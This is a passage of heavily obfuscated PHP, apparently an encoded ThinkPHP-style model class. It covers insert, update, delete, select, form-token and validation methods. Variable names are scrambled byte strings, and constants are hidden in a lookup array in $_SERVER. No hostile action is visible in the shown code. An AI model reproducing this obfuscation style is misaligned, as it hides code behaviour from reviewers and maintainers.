$¢à”ÏÎÉ[357]), array($‰÷ˆ”‡Ô, $Í–¹ı—‹, $ŠíŸ«ê–)); if ($Øğ²§§¥) { return $Øğ²§§¥; } } return $ŠíŸ«ê–; } protected function _initialize() { } protected function _facade($ìøçÜ“Ç) { $±¦êûÉ€ =& $_SERVER[ŒÅŸ‹ä†]; if (!empty($this->fields)) { foreach ($ìøçÜ“Ç as $ÉŸ·ˆ° => $£«”¦Á²) { if (is_array($this->fields) && !in_array($ÉŸ·ˆ°, $this->fields, !0)) { unset($ìøçÜ“Ç[$ÉŸ·ˆ°]); } elseif (is_scalar($£«”¦Á²)) { $this->_parseType($ìøçÜ“Ç, $ÉŸ·ˆ°); } } } if (!empty($this->options[$±¦êûÉ€[358]])) { $ìøçÜ“Ç = array_map($this->options[$±¦êûÉ€[358]], $ìøçÜ“Ç); unset($this->options[$±¦êûÉ€[358]]); } $this->_beforeWrite($ìøçÜ“Ç); return $ìøçÜ“Ç; } protected function _beforeWrite(&$¼·‚İµ) { } public function add($£ºª‡ß² = '', $Ú´®¦¡Š = array(), $ô®¶éèÎ = false) { if (empty($£ºª‡ß²)) { if (!empty($this->data)) { $£ºª‡ß² = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ŒÅŸ‹ä†][359]); return !1; } } $Ú´®¦¡Š = $this->_parseOptions($Ú´®¦¡Š); $£ºª‡ß² = $this->_facade($£ºª‡ß²); if (!1 === $this->_beforeInsert($£ºª‡ß², $Ú´®¦¡Š)) { return !1; } $ÚüÁâÛŸ = $this->db->insert($£ºª‡ß², $Ú´®¦¡Š, $ô®¶éèÎ); if (!1 !== $ÚüÁâÛŸ) { $æ‰Í¸¥œ = $this->getLastInsID(); if ($æ‰Í¸¥œ) { $£ºª‡ß²[$this->getPk()] = $æ‰Í¸¥œ; $this->_after_insert($£ºª‡ß², $Ú´®¦¡Š); return $æ‰Í¸¥œ; } $this->_after_insert($£ºª‡ß², $Ú´®¦¡Š); } return $ÚüÁâÛŸ; } protected function _beforeInsert(&$º„®ëÁİ, $Â¦ªœ†î) { } protected function _after_insert($äã‘òãÄ, $ª«ŸĞÄ×) { } public function addAll($™·´ıñ×, $³È˜öŸ = array(), $Í”í·Ò¼ = false) { $‚½íñ­¿ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($™·´ıñ×)) { $this->error = think_lang($‚½íñ­¿[359]); return !1; } $³È˜öŸ = $this->_parseOptions($³È˜öŸ); foreach ($™·´ıñ× as $îÒÓ¡Ôç => $•”‡Í€¬) { $™·´ıñ×[$îÒÓ¡Ôç] = $this->_facade($•”‡Í€¬); } if (method_exists($this->db, $‚½íñ­¿[360])) { $Õû÷ß¢Ä = $this->db->insertAll($™·´ıñ×, $³È˜öŸ, $Í”í·Ò¼); } else { $this->startTrans(); foreach ($™·´ıñ× as $îÒÓ¡Ôç => $•”‡Í€¬) { $Õû÷ß¢Ä = $this->db->insert($•”‡Í€¬, $³È˜öŸ, $Í”í·Ò¼); } $this->commit(); } if (!1 !== $Õû÷ß¢Ä) { $ù¤Æâëª = $this->getLastInsID(); if ($ù¤Æâëª) { return $ù¤Æâëª; } } return $Õû÷ß¢Ä; } public function selectAdd($ä”“›¯ = '', $‰áÉÓˆ = '', $³æäÇ· = array()) { $â©ï§æì =& $_SERVER[ŒÅŸ‹ä†]; $³æäÇ· = $this->_parseOptions($³æäÇ·); if (!1 === ($ò›”ñ¡ = $this->db->selectInsert($ä”“›¯ ? $ä”“›¯ : $³æäÇ·[$â©ï§æì[361]], $‰áÉÓˆ ? $‰áÉÓˆ : $this->getTableName(), $³æäÇ·))) { $this->error = think_lang($â©ï§æì[362]); return !1; } else { return $ò›”ñ¡; } } public function save($íØìË¹å = '', $•…åœË¢ = array()) { $Åû—“ˆâ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($íØìË¹å)) { if (!empty($this->data)) { $íØìË¹å = $this->data; $this->data = array(); } else { $this->error = think_lang($Åû—“ˆâ[359]); return !1; } } $íØìË¹å = $this->_facade($íØìË¹å); $•…åœË¢ = $this->_parseOptions($•…åœË¢); $æ¸…Ï = $this->getPk(); if (!isset($•…åœË¢[$Åû—“ˆâ[363]])) { if (isset($íØìË¹å[$æ¸…Ï])) { $‡ÛÚñØğ[$æ¸…Ï] = $íØìË¹å[$æ¸…Ï]; $•…åœË¢[$Åû—“ˆâ[363]] = $‡ÛÚñØğ; unset($íØìË¹å[$æ¸…Ï]); } else { $this->error = think_lang($Åû—“ˆâ[362]); return !1; } } if (is_array($•…åœË¢[$Åû—“ˆâ[363]]) && isset($•…åœË¢[$Åû—“ˆâ[363]][$æ¸…Ï])) { $µœ®ÉŒÖ = $•…åœË¢[$Åû—“ˆâ[363]][$æ¸…Ï]; } if (!1 === $this->_beforeUpdate($íØìË¹å, $•…åœË¢)) { return !1; } $­ô¾‡ğ‡ = $this->db->update($íØìË¹å, $•…åœË¢); if (!1 !== $­ô¾‡ğ‡) { if (isset($µœ®ÉŒÖ)) { $íØìË¹å[$æ¸…Ï] = $µœ®ÉŒÖ; } $this->_afterUpdate($íØìË¹å, $•…åœË¢); } return $­ô¾‡ğ‡; } protected function _beforeUpdate(&$³şâóÄ, $å‡ÅŠ±ß) { } protected function _afterUpdate($¨ŒÒÚ±¦, $ôİ¥Í¯) { } public function delete($ïò£¼üğ = array()) { $Ù÷­¡Ë =& $_SERVER[ŒÅŸ‹ä†]; if (empty($ïò£¼üğ) && empty($this->options[$Ù÷­¡Ë[363]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $òÚ”¨É¡ = $this->getPk(); if (is_numeric($ïò£¼üğ) || is_string($ïò£¼üğ)) { if (strpos($ïò£¼üğ, $Ù÷­¡Ë[60])) { $ÊÖ°»¸[$òÚ”¨É¡] = array($Ù÷­¡Ë[364], $ïò£¼üğ); } else { $ÊÖ°»¸[$òÚ”¨É¡] = $ïò£¼üğ; } $this->options[$Ù÷­¡Ë[363]] = $ÊÖ°»¸; } $ïò£¼üğ = $this->_parseOptions(); if (is_array($ïò£¼üğ[$Ù÷­¡Ë[363]]) && isset($ïò£¼üğ[$Ù÷­¡Ë[363]][$òÚ”¨É¡])) { $éã·¢ë = $ïò£¼üğ[$Ù÷­¡Ë[363]][$òÚ”¨É¡]; } $»“¨˜õ = $this->db->delete($ïò£¼üğ); if (!1 !== $»“¨˜õ) { $àş’ª°Ü = array(); if (isset($éã·¢ë)) { $àş’ª°Ü[$òÚ”¨É¡] = $éã·¢ë; } $this->_after_delete($àş’ª°Ü, $ïò£¼üğ); } return $»“¨˜õ; } protected function _after_delete($³Å©ñ’, $²˜ÃŞò²) { } public function select($ÖöÆƒö = array()) { $Áöá®À£ =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($ÖöÆƒö) || is_numeric($ÖöÆƒö)) { $Ö•ÓÍ = $this->getPk(); if (strpos($ÖöÆƒö, $Áöá®À£[60])) { $¿´­ß‚î[$Ö•ÓÍ] = array($Áöá®À£[364], $ÖöÆƒö); } else { $¿´­ß‚î[$Ö•ÓÍ] = $ÖöÆƒö; } $this->options[$Áöá®À£[363]] = $¿´­ß‚î; } elseif (!1 === $ÖöÆƒö) { $ÖöÆƒö = $this->_parseOptions(); return $Áöá®À£[365] . $this->db->buildSelectSql($ÖöÆƒö) . $Áöá®À£[366]; } $ÖöÆƒö = $this->_parseOptions(); $‰à”¶í = $this->db->select($ÖöÆƒö); if (!1 === $‰à”¶í) { return !1; } if (empty($‰à”¶í)) { return null; } $this->_afterSelect($‰à”¶í, $ÖöÆƒö); return $‰à”¶í; } protected function _afterSelect(&$¹—¶Îø¿, $´î‹µ÷) { } public function buildSql($ø¹§¥ù = array()) { $Ñá”´ğ‘ =& $_SERVER[ŒÅŸ‹ä†]; $ø¹§¥ù = $this->_parseOptions($ø¹§¥ù); return $Ñá”´ğ‘[365] . $this->db->buildSelectSql($ø¹§¥ù) . $Ñá”´ğ‘[366]; } public function optionsValue($ù—Ü»¸Õ = null) { if (is_null($ù—Ü»¸Õ)) { return $this->options; } elseif (is_array($ù—Ü»¸Õ)) { $this->options = array_merge($this->options, $ù—Ü»¸Õ); } } protected function _parseOptions($î½ìé‹ı = array()) { $ÓğØ…Ä½ =& $_SERVER[ŒÅŸ‹ä†]; if (is_array($î½ìé‹ı)) { $î½ìé‹ı = array_merge($this->options, $î½ìé‹ı); } $this->options = array(); if (!isset($î½ìé‹ı[$ÓğØ…Ä½[367]])) { $î½ìé‹ı[$ÓğØ…Ä½[367]] = $this->getTableName(); $Ò»ÚÄŠá = $this->fields; } else { $Ò»ÚÄŠá = $this->getDbFields(); } if (!empty($î½ìé‹ı[$ÓğØ…Ä½[368]])) { $î½ìé‹ı[$ÓğØ…Ä½[367]] .= $ÓğØ…Ä½[63] . $î½ìé‹ı[$ÓğØ…Ä½[368]]; } $î½ìé‹ı[$ÓğØ…Ä½[369]] = $this->name; if (isset($î½ìé‹ı[$ÓğØ…Ä½[363]]) && is_array($î½ìé‹ı[$ÓğØ…Ä½[363]]) && !empty($Ò»ÚÄŠá) && !isset($î½ìé‹ı[$ÓğØ…Ä½[370]]) && !isset($î½ìé‹ı[$ÓğØ…Ä½[367]])) { foreach ($î½ìé‹ı[$ÓğØ…Ä½[363]] as $¡ñúâ‹” => $¤ŒÄ£ÊÌ) { $¡ñúâ‹” = trim($¡ñúâ‹”); if (in_array($¡ñúâ‹”, $Ò»ÚÄŠá, !0)) { if (is_scalar($¤ŒÄ£ÊÌ)) { $this->_parseType($î½ìé‹ı[$ÓğØ…Ä½[363]], $¡ñúâ‹”); } } elseif (!is_numeric($¡ñúâ‹”) && $ÓğØ…Ä½[11] != substr($¡ñúâ‹”, 0, 1) && !1 === strpos($¡ñúâ‹”, $ÓğØ…Ä½[10]) && !1 === strpos($¡ñúâ‹”, $ÓğØ…Ä½[347]) && !1 === strpos($¡ñúâ‹”, $ÓğØ…Ä½[223]) && !1 === strpos($¡ñúâ‹”, $ÓğØ…Ä½[295])) { unset($î½ìé‹ı[$ÓğØ…Ä½[363]][$¡ñúâ‹”]); } } } $this->_options_filter($î½ìé‹ı); return $î½ìé‹ı; } protected function _options_filter(&$™¦°±½ç) { } protected function _parseType(&$®ÍÁ«­á, $‰»”ë) { $îÜéÌ†™ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($this->options[$îÜéÌ†™[371]][$îÜéÌ†™[4] . $‰»”ë])) { $”ÀÓÁ÷Ù = strtolower($this->fields[$îÜéÌ†™[339]][$‰»”ë]); if (!1 !== strpos($”ÀÓÁ÷Ù, $îÜéÌ†™[372])) { } elseif (!1 === strpos($”ÀÓÁ÷Ù, $îÜéÌ†™[373]) && !1 !== strpos($”ÀÓÁ÷Ù, $îÜéÌ†™[374])) { $®ÍÁ«­á[$‰»”ë] = intval($®ÍÁ«­á[$‰»”ë]); } elseif (!1 !== strpos($”ÀÓÁ÷Ù, $îÜéÌ†™[375]) || !1 !== strpos($”ÀÓÁ÷Ù, $îÜéÌ†™[376])) { $®ÍÁ«­á[$‰»”ë] = floatval($®ÍÁ«­á[$‰»”ë]); } elseif (!1 !== strpos($”ÀÓÁ÷Ù, $îÜéÌ†™[377])) { $®ÍÁ«­á[$‰»”ë] = (bool) $®ÍÁ«­á[$‰»”ë]; } } } public function find($èü¿îá = array()) { $†„õŸÉê =& $_SERVER[ŒÅŸ‹ä†]; if (is_numeric($èü¿îá) || is_string($èü¿îá)) { $¥ŠŒä²Ø[$this->getPk()] = intval($èü¿îá); $this->options[$†„õŸÉê[363]] = $¥ŠŒä²Ø; } $this->options[$†„õŸÉê[378]] = 1; $èü¿îá = $this->_parseOptions(); $øåÜ½¼Ñ = $this->db->select($èü¿îá); if (!1 === $øåÜ½¼Ñ) { return !1; } if (empty($øåÜ½¼Ñ)) { return null; } $×¦Å¼µï = $øåÜ½¼Ñ[0]; $this->_afterFind($×¦Å¼µï, $èü¿îá); return $×¦Å¼µï; } protected function _afterFind(&$’Ëßóœå, $æÌø…µñ) { } protected function returnResult($ë£æÔÚ, $õó¹«¸ï = '') { $Ú£šÖ³ =& $_SERVER[ŒÅŸ‹ä†]; if ($õó¹«¸ï) { if (is_callable($õó¹«¸ï)) { return call_user_func($õó¹«¸ï, $ë£æÔÚ); } switch (strtolower($õó¹«¸ï)) { case $Ú£šÖ³[379]: return json_encode($ë£æÔÚ); case $Ú£šÖ³[380]: return xml_encode($ë£æÔÚ); } } return $ë£æÔÚ; } public function parseFieldsMap($º§©ûª¿, $¿„½€ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $©å ç‹› => $Ü„ßõé´) { if ($¿„½€ == 1) { if (isset($º§©ûª¿[$Ü„ßõé´])) { $º§©ûª¿[$©å ç‹›] = $º§©ûª¿[$Ü„ßõé´]; unset($º§©ûª¿[$Ü„ßõé´]); } } else { if (isset($º§©ûª¿[$©å ç‹›])) { $º§©ûª¿[$Ü„ßõé´] = $º§©ûª¿[$©å ç‹›]; unset($º§©ûª¿[$©å ç‹›]); } } } } return $º§©ûª¿; } public function setField($õüÎê‚€, $£û£ùÀ» = '') { if (is_array($õüÎê‚€)) { $›à©­£• = $õüÎê‚€; } else { $›à©­£•[$õüÎê‚€] = $£û£ùÀ»; } return $this->save($›à©­£•); } public function setAdd($³¯¤Ê±, $£–Œ‡¿Í = 1) { $‘Œ°ğ’ =& $_SERVER[ŒÅŸ‹ä†]; $ñ‘¿†ª = $³¯¤Ê± . $‘Œ°ğ’[381] . $£–Œ‡¿Í; if ($£–Œ‡¿Í < 0) { $ñ‘¿†ª = $³¯¤Ê± . $£–Œ‡¿Í; } return $this->setField($³¯¤Ê±, array($‘Œ°ğ’[382], $ñ‘¿†ª)); } public function getField($›ıõ¸¶, $Å»Òíœ = null) { $í¤­ç¥ =& $_SERVER[ŒÅŸ‹ä†]; $Áùî«¥ë[$í¤­ç¥[361]] = $›ıõ¸¶; $Áùî«¥ë = $this->_parseOptions($Áùî«¥ë); $›ıõ¸¶ = trim($›ıõ¸¶); if (strpos($›ıõ¸¶, $í¤­ç¥[60])) { if (!isset($Áùî«¥ë[$í¤­ç¥[378]])) { $Áùî«¥ë[$í¤­ç¥[378]] = is_numeric($Å»Òíœ) ? $Å»Òíœ : $í¤­ç¥[12]; } $‹İÜ—¡¿ = $this->db->select($Áùî«¥ë); if (!empty($‹İÜ—¡¿)) { $Ãş‘”’ğ = explode($í¤­ç¥[60], $›ıõ¸¶); $›ıõ¸¶ = array_keys($‹İÜ—¡¿[0]); $ŠØ×›İâ = array_shift($›ıõ¸¶); $²ŒíñÚù = array_shift($›ıõ¸¶); $Ïã¶‹¥ç = array(); $ÆÔ×ş·Â = count($Ãş‘”’ğ); foreach ($‹İÜ—¡¿ as $û¿×©ÊÁ) { $»¹ş¢» = $û¿×©ÊÁ[$ŠØ×›İâ]; if (2 == $ÆÔ×ş·Â) { $Ïã¶‹¥ç[$»¹ş¢»] = $û¿×©ÊÁ[$²ŒíñÚù]; } else { $Ïã¶‹¥ç[$»¹ş¢»] = is_string($Å»Òíœ) ? implode($Å»Òíœ, $û¿×©ÊÁ) : $û¿×©ÊÁ; } } return $Ïã¶‹¥ç; } } else { if (!0 !== $Å»Òíœ) { $Áùî«¥ë[$í¤­ç¥[378]] = is_numeric($Å»Òíœ) ? $Å»Òíœ : 1; } if ($Å»Òíœ === $í¤­ç¥[342]) { unset($Áùî«¥ë[$í¤­ç¥[378]]); } $û¿×©ÊÁ = $this->db->select($Áùî«¥ë); if (!empty($û¿×©ÊÁ)) { if ($Å»Òíœ === $í¤­ç¥[342]) { return reset($û¿×©ÊÁ[0]); } if (!0 !== $Å»Òíœ && 1 == $Áùî«¥ë[$í¤­ç¥[378]]) { return reset($û¿×©ÊÁ[0]); } foreach ($û¿×©ÊÁ as $µ„’ñî¬) { $Ÿ•É ÈÀ[] = $µ„’ñî¬[$›ıõ¸¶]; } return $Ÿ•É ÈÀ; } } return null; } public function create($¬†ªø»ì = '', $öÀœ“´£ = '') { $‡èîŠ¥° =& $_SERVER[ŒÅŸ‹ä†]; if (empty($¬†ªø»ì)) { $¬†ªø»ì = $_POST; } elseif (is_object($¬†ªø»ì)) { $¬†ªø»ì = get_object_vars($¬†ªø»ì); } if (empty($¬†ªø»ì) || !is_array($¬†ªø»ì)) { $this->error = think_lang($‡èîŠ¥°[359]); return !1; } $¬†ªø»ì = $this->parseFieldsMap($¬†ªø»ì, 0); $öÀœ“´£ = $öÀœ“´£ ? $öÀœ“´£ : (!empty($¬†ªø»ì[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‡èîŠ¥°[361]])) { $îüÁ´¨ = $this->options[$‡èîŠ¥°[361]]; unset($this->options[$‡èîŠ¥°[361]]); } elseif ($öÀœ“´£ == THINK_MODEL_INSERT && isset($this->insertFields)) { $îüÁ´¨ = $this->insertFields; } elseif ($öÀœ“´£ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $îüÁ´¨ = $this->updateFields; } if (isset($îüÁ´¨)) { if (is_string($îüÁ´¨)) { $îüÁ´¨ = explode($‡èîŠ¥°[60], $îüÁ´¨); } if (think_config($‡èîŠ¥°[383])) { $îüÁ´¨[] = think_config($‡èîŠ¥°[384]); } foreach ($¬†ªø»ì as $ò±¹ª–¿ => $¥ÓôÑÆ) { if (!in_array($ò±¹ª–¿, $îüÁ´¨)) { unset($¬†ªø»ì[$ò±¹ª–¿]); } } } if (!$this->autoValidation($¬†ªø»ì, $öÀœ“´£)) { return !1; } if (!$this->autoCheckToken($¬†ªø»ì)) { $this->error = think_lang($‡èîŠ¥°[385]); return !1; } if ($this->autoCheckFields) { $îüÁ´¨ = $this->getDbFields(); foreach ($¬†ªø»ì as $ò±¹ª–¿ => $¥ÓôÑÆ) { if (!in_array($ò±¹ª–¿, $îüÁ´¨)) { unset($¬†ªø»ì[$ò±¹ª–¿]); } elseif (MAGIC_QUOTES_GPC && is_string($¥ÓôÑÆ)) { $¬†ªø»ì[$ò±¹ª–¿] = stripslashes($¥ÓôÑÆ); } } } $this->autoOperation($¬†ªø»ì, $öÀœ“´£); $this->data = $¬†ªø»ì; return $¬†ªø»ì; } public function autoCheckToken($»»‡ï´õ) { $Ìë‰Ë©Ù =& $_SERVER[ŒÅŸ‹ä†]; if (isset($this->options[$Ìë‰Ë©Ù[386]]) && !$this->options[$Ìë‰Ë©Ù[386]]) { return !0; } if (think_config($Ìë‰Ë©Ù[383])) { $¸Î™Ä = think_config($Ìë‰Ë©Ù[384]); if (!isset($»»‡ï´õ[$¸Î™Ä]) || Session::get($¸Î™Ä)) { return !1; } list($óë¹›÷‹, $äºñ½Ü±) = explode($Ìë‰Ë©Ù[11], $»»‡ï´õ[$¸Î™Ä]); if ($äºñ½Ü± && Session::get($¸Î™Ä . $Ìë‰Ë©Ù[10] . $óë¹›÷‹) === $äºñ½Ü±) { Session::remove($¸Î™Ä . $Ìë‰Ë©Ù[10] . $óë¹›÷‹); return !0; } if (think_config($Ìë‰Ë©Ù[387])) { Session::remove($¸Î™Ä . $Ìë‰Ë©Ù[10] . $óë¹›÷‹); } return !1; } return !0; } public function regex($½ÏÊÇÔ®, $šÁÍû°Ğ) { $ÂÕ¿ë¸“ =& $_SERVER[ŒÅŸ‹ä†]; $£­¸ÏÄ = array($ÂÕ¿ë¸“[388] => $ÂÕ¿ë¸“[389], $ÂÕ¿ë¸“[390] => $ÂÕ¿ë¸“[391], $ÂÕ¿ë¸“[392] => $ÂÕ¿ë¸“[393], $ÂÕ¿ë¸“[394] => $ÂÕ¿ë¸“[395], $ÂÕ¿ë¸“[396] => $ÂÕ¿ë¸“[397], $ÂÕ¿ë¸“[398] => $ÂÕ¿ë¸“[399], $ÂÕ¿ë¸“[400] => $ÂÕ¿ë¸“[401], $ÂÕ¿ë¸“[376] => $ÂÕ¿ë¸“[402], $ÂÕ¿ë¸“[403] => $ÂÕ¿ë¸“[404]); if (isset($£­¸ÏÄ[strtolower($šÁÍû°Ğ)])) { $šÁÍû°Ğ = $£­¸ÏÄ[strtolower($šÁÍû°Ğ)]; } return preg_match($šÁÍû°Ğ, $½ÏÊÇÔ®) === 1; } private function autoOperation(&$”³ñ¯¤, $ÖŠİã“ß) { $àÒş±ì² =& $_SERVER[ŒÅŸ‹ä†]; if (!empty($this->options[$àÒş±ì²[405]])) { $Ô¨ü‡ù = $this->options[$àÒş±ì²[405]]; unset($this->options[$àÒş±ì²[405]]); } elseif (!empty($this->_auto)) { $Ô¨ü‡ù = $this->_auto; } if (isset($Ô¨ü‡ù)) { foreach ($Ô¨ü‡ù as $æÅ³ãûÙ) { if (empty($æÅ³ãûÙ[2])) { $æÅ³ãûÙ[2] = THINK_MODEL_INSERT; } if ($ÖŠİã“ß == $æÅ³ãûÙ[2] || $æÅ³ãûÙ[2] == THINK_MODEL_BOTH) { switch (trim($æÅ³ãûÙ[3])) { case $àÒş±ì²[406]: case $àÒş±ì²[407]: $µÁ¿§¹„ = isset($æÅ³ãûÙ[4]) ? (array) $æÅ³ãûÙ[4] : array(); if (isset($”³ñ¯¤[$æÅ³ãûÙ[0]])) { array_unshift($µÁ¿§¹„, $”³ñ¯¤[$æÅ³ãûÙ[0]]); } if ($àÒş±ì²[406] == $æÅ³ãûÙ[3]) { $”³ñ¯¤[$æÅ³ãûÙ[0]] = call_user_func_array($æÅ³ãûÙ[1], $µÁ¿§¹„); } else { $”³ñ¯¤[$æÅ³ãûÙ[0]] = call_user_func_array(array(&$this, $æÅ³ãûÙ[1]), $µÁ¿§¹„); } break; case $àÒş±ì²[361]: $”³ñ¯¤[$æÅ³ãûÙ[0]] = $”³ñ¯¤[$æÅ³ãûÙ[1]]; break; case $àÒş±ì²[408]: if ($àÒş±ì²[12] === $”³ñ¯¤[$æÅ³ãûÙ[0]]) { unset($”³ñ¯¤[$æÅ³ãûÙ[0]]); } break; case $àÒş±ì²[409]: default: $”³ñ¯¤[$æÅ³ãûÙ[0]] = $æÅ³ãûÙ[1]; } if (!1 === $”³ñ¯¤[$æÅ³ãûÙ[0]]) { unset($”³ñ¯¤[$æÅ³ãûÙ[0]]); } } } } return $”³ñ¯¤; } protected function autoValidation($Ç­ùó‰, $ÁŞÚµşÀ) { $İ€Éü´³ =& $_SERVER[ŒÅŸ‹ä†]; if (!empty($this->options[$İ€Éü´³[410]])) { $ÒÌ‹İİ = $this->options[$İ€Éü´³[410]]; unset($this->options[$İ€Éü´³[410]]); } elseif (!empty($this->_validate)) { $ÒÌ‹İİ = $this->_validate; } if (isset($ÒÌ‹İİ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÒÌ‹İİ as $‘°ÅŸ… => $ÙŠàÍƒ) { if (empty($ÙŠàÍƒ[5]) || $ÙŠàÍƒ[5] == THINK_MODEL_BOTH || $ÙŠàÍƒ[5] == $ÁŞÚµşÀ) { if (0 == strpos($ÙŠàÍƒ[2], $İ€Éü´³[411]) && strpos($ÙŠàÍƒ[2], $İ€Éü´³[412])) { $ÙŠàÍƒ[2] = think_lang(substr($ÙŠàÍƒ[2], 2, -1)); } $ÙŠàÍƒ[3] = isset($ÙŠàÍƒ[3]) ? $ÙŠàÍƒ[3] : THINK_EXISTS_VALIDATE; $ÙŠàÍƒ[4] = isset($ÙŠàÍƒ[4]) ? $ÙŠàÍƒ[4] : $İ€Éü´³[413]; switch ($ÙŠàÍƒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ç­ùó‰, $ÙŠàÍƒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($İ€Éü´³[12] != trim($Ç­ùó‰[$ÙŠàÍƒ[0]])) { if (!1 === $this->_validationField($Ç­ùó‰, $ÙŠàÍƒ)) { return !1; } } break; default: if (isset($Ç­ùó‰[$ÙŠàÍƒ[0]])) { if (!1 === $this->_validationField($Ç­ùó‰, $ÙŠàÍƒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ì…­ş­«, $ ÛìËüÓ) { if (!1 === $this->_validationFieldItem($Ì…­ş­«, $ ÛìËüÓ)) { if ($this->patchValidate) { $this->error[$ ÛìËüÓ[0]] = $ ÛìËüÓ[2]; } else { $this->error = $ ÛìËüÓ[2]; return !1; } } return; } protected function _validationFieldItem($ÊÀ¡ü’–, $§½ØÙ) { $£ûòÏ¥ =& $_SERVER[ŒÅŸ‹ä†]; switch (strtolower(trim($§½ØÙ[4]))) { case $£ûòÏ¥[406]: case $£ûòÏ¥[407]: $Ü–ªÜ±¬ = isset($§½ØÙ[6]) ? (array) $§½ØÙ[6] : array(); if (is_string($§½ØÙ[0]) && strpos($§½ØÙ[0], $£ûòÏ¥[60])) { $§½ØÙ[0] = explode($£ûòÏ¥[60], $§½ØÙ[0]); } if (is_array($§½ØÙ[0])) { foreach ($§½ØÙ[0] as $Â‘Ï€™‹) { $ìªÊü¼[$Â‘Ï€™‹] = $ÊÀ¡ü’–[$Â‘Ï€™‹]; } array_unshift($Ü–ªÜ±¬, $ìªÊü¼); } else { array_unshift($Ü–ªÜ±¬, $ÊÀ¡ü’–[$§½ØÙ[0]]); } if ($£ûòÏ¥[406] == $§½ØÙ[4]) { return call_user_func_array($§½ØÙ[1], $Ü–ªÜ±¬); } else { return call_user_func_array(array(&$this, $§½ØÙ[1]), $Ü–ªÜ±¬); } case $£ûòÏ¥[414]: return $ÊÀ¡ü’–[$§½ØÙ[0]] == $ÊÀ¡ü’–[$§½ØÙ[1]]; case $£ûòÏ¥[415]: if (is_string($§½ØÙ[0]) && strpos($§½ØÙ[0], $£ûòÏ¥[60])) { $§½ØÙ[0] = explode($£ûòÏ¥[60], $§½ØÙ[0]); } $ØÙ‡Ñ“÷ = array(); if (is_array($§½ØÙ[0])) { foreach ($§½ØÙ[0] as $Â‘Ï€™‹) { $ØÙ‡Ñ“÷[$Â‘Ï€™‹] = $ÊÀ¡ü’–[$Â‘Ï€™‹]; } } else { $ØÙ‡Ñ“÷[$§½ØÙ[0]] = $ÊÀ¡ü’–[$§½ØÙ[0]]; } if (!empty($ÊÀ¡ü’–[$this->getPk()])) { $ØÙ‡Ñ“÷[$this->getPk()] = array($£ûòÏ¥[416], $ÊÀ¡ü’–[$this->getPk()]); } if ($this->where($ØÙ‡Ñ“÷)->find()) { return !1; } return !0; default: return $this->check($ÊÀ¡ü’–[$§½ØÙ[0]], $§½ØÙ[1], $§½ØÙ[4]); } } public function check($×éç¿¼´, $¸¿‰ÎËª, $™ˆ™î®‹ = "\162\x65\147\x65\170") { $¦¸€Ì°¤ =& $_SERVER[ŒÅŸ‹ä†]; $™ˆ™î®‹ = strtolower(trim($™ˆ™î®‹)); switch ($™ˆ™î®‹) { case $¦¸€Ì°¤[7]: case $¦¸€Ì°¤[417]: $ˆ¦ı¶¿ = is_array($¸¿‰ÎËª) ? $¸¿‰ÎËª : explode($¦¸€Ì°¤[60], $¸¿‰ÎËª); return $™ˆ™î®‹ == $¦¸€Ì°¤[7] ? in_array($×éç¿¼´, $ˆ¦ı¶¿) : !in_array($×éç¿¼´, $ˆ¦ı¶¿); case $¦¸€Ì°¤[418]: case $¦¸€Ì°¤[419]: if (is_array($¸¿‰ÎËª)) { $’†¹„é = $¸¿‰ÎËª[0]; $ìŞó¯âÕ = $¸¿‰ÎËª[1]; } else { list($’†¹„é, $ìŞó¯âÕ) = explode($¦¸€Ì°¤[60], $¸¿‰ÎËª); } return $™ˆ™î®‹ == $¦¸€Ì°¤[418] ? $×éç¿¼´ >= $’†¹„é && $×éç¿¼´ <= $ìŞó¯âÕ : $×éç¿¼´ < $’†¹„é || $×éç¿¼´ > $ìŞó¯âÕ; case $¦¸€Ì°¤[420]: case $¦¸€Ì°¤[421]: return $™ˆ™î®‹ == $¦¸€Ì°¤[420] ? $×éç¿¼´ == $¸¿‰ÎËª : $×éç¿¼´ != $¸¿‰ÎËª; case $¦¸€Ì°¤[422]: $Ì¼£Ÿ†Ã = mb_strlen($×éç¿¼´, $¦¸€Ì°¤[423]); if (strpos($¸¿‰ÎËª, $¦¸€Ì°¤[60])) { list($’†¹„é, $ìŞó¯âÕ) = explode($¦¸€Ì°¤[60], $¸¿‰ÎËª); return $Ì¼£Ÿ†Ã >= $’†¹„é && $Ì¼£Ÿ†Ã <= $ìŞó¯âÕ; } else { return $Ì¼£Ÿ†Ã == $¸¿‰ÎËª; } case $¦¸€Ì°¤[424]: list($ú¼©êÅÍ, $š¾¾´ºî) = explode($¦¸€Ì°¤[60], $¸¿‰ÎËª); if (!is_numeric($ú¼©êÅÍ)) { $ú¼©êÅÍ = strtotime($ú¼©êÅÍ); } if (!is_numeric($š¾¾´ºî)) { $š¾¾´ºî = strtotime($š¾¾´ºî); } return NOW_TIME >= $ú¼©êÅÍ && NOW_TIME <= $š¾¾´ºî; case $¦¸€Ì°¤[425]: return in_array(get_client_ip(), explode($¦¸€Ì°¤[60], $¸¿‰ÎËª)); case $¦¸€Ì°¤[426]: return !in_array(get_client_ip(), explode($¦¸€Ì°¤[60], $¸¿‰ÎËª)); case $¦¸€Ì°¤[413]: default: return $this->regex($×éç¿¼´, $¸¿‰ÎËª); } } public function query($’‘¥¶†ş, $ª–â¸‰‰ = false) { $«™ğí­« =& $_SERVER[ŒÅŸ‹ä†]; if (!is_bool($ª–â¸‰‰) && !is_array($ª–â¸‰‰)) { $ª–â¸‰‰ = func_get_args(); array_shift($ª–â¸‰‰); } $’‘¥¶†ş = str_replace(array($«™ğí­«[18], $«™ğí­«[427]), $«™ğí­«[63], $’‘¥¶†ş); $’‘¥¶†ş = $this->parseSql($’‘¥¶†ş, $ª–â¸‰‰); return $this->db->query($’‘¥¶†ş); } public function execute($àƒ Áùî, $¨½¡šÄú = false) { if 